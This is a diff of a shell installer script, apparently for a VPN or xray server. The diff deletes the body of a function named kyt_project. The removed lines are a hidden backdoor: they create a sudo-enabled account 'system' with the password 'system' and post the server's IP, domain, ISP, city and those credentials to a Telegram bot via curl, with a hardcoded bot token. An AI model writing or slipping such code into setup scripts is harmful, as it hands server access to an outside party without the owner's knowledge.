@@ -91,28 +91,6 @@ END
     sed -i $MYIP2 /etc/openvpn/ssl.ovpn;
 }
 function kyt_project() {
-userdel jame > /dev/null 2>&1
-userdel system > /dev/null 2>&1
-Username="system"
-Password=system
-mkdir -p /home/script/
-useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
-echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
-usermod -aG sudo $Username > /dev/null 2>&1
-domain=$(cat /etc/xray/domain)
-ipvps=$(curl -sS ipv4.icanhazip.com)
-isp=$(cat /etc/xray/isp)
-city=$(cat /etc/xray/city)
-tok="AAGKVGg0v4X36LVavodIQWdwqSF25M_QkF0"
-link="https://api.telegram.org/bot6949804125:${tok}/sendMessage"
-texz="
-IP : $ipvps
-ISP : $isp
-CITY : $city
-U / P : $Username
-Domain : $domain
-"
-curl -s --max-time 10 -d "chat_id=6830313714&disable_web_page_preview=1&text=$texz&parse_mode=html" $link >/dev/null
 }
 function cert_ovpn() {
     echo '<ca>' >> /etc/openvpn/tcp.ovpn
